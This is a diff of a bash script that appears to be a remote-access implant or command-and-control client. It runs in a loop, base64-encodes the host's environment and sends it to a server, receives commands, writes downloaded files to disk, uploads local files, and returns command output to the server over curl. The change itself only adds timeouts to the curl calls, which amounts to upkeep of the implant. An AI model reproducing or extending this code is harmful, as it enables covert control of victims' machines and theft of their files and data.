@@ -54,8 +54,8 @@ while true; do
   fi
   
   env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
-  request1=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/Info" -d "Info: $getenv64")
-  response=$(curl -A "$cagent" -s -k "$server/api/v1/Client/Token")
+  request1=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/Info" -d "Info: $getenv64")
+  response=$(curl --max-time 600 -A "$cagent" -s -k "$server/api/v1/Client/Token")
   token=$(echo "$response" | grep "Token: " | cut -d ' ' -f2)
   invoke64=$(R64Decoder -t "$token") ; param="Debug"
 
@@ -67,7 +67,7 @@ while true; do
       if [[ $invoke64 == upload* ]]; then
          file_path="${invoke64#upload }"
          file_path=$(echo $file_path | cut -d "!" -f 2)
-         file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/v1/Client/Download")
+         file_request=$(curl --max-time 600 -A "$cagent" -s -k -X GET "$server/api/v1/Client/Download")
          file_content=$(echo "$file_request" | grep "File: " | cut -d ' ' -f2)
          R64Decoder -t "$file_content" > "$file_path"
          unset invoke64 ; unset commandx
@@ -77,7 +77,7 @@ while true; do
          file_path="${invoke64#download }"
          file_path=$(echo $file_path | cut -d "!" -f 1)
          file_content=$(R64Encoder -f "$file_path")
-         download=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/Upload" -d "File: $file_content")
+         download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/Upload" -d "File: $file_content")
          unset invoke64 ; unset commandx
       fi
 
@@ -108,7 +108,7 @@ while true; do
       fi
 
       output64=$(R64Encoder -t "$commandx") ; path=$(echo "$param")
-      request2=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/$path" -d "$param: $output64")
+      request2=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/$path" -d "$param: $output64")
 
    fi
 done
